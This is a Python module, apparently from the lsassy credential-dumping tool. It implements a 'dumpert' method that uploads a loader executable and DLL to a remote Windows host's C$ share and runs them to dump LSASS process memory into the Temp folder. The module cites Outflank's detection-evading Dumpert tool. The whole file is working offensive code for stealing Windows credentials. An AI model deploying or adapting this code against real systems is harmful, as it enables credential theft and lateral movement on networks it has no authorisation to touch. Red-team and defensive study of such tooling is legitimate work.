"""
https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e
https://github.com/outflanknl/Dumpert/
"""

from lsassy.dumpmethod import IDumpMethod, Dependency

class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.loader = Dependency("rpcloader", "rpc.exe")
        self.dll = Dependency("dll", "rpc.dll")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.loader, self.dll])

    def clean(self):
        self.clean_dependencies([self.loader, self.dll])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} {}""".format(
            self.loader.get_remote_path(),self.dll.get_remote_path()
        )
        pwsh_command = """{} {}""".format(
            self.loader.get_remote_path(),self.dll.get_remote_path()
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
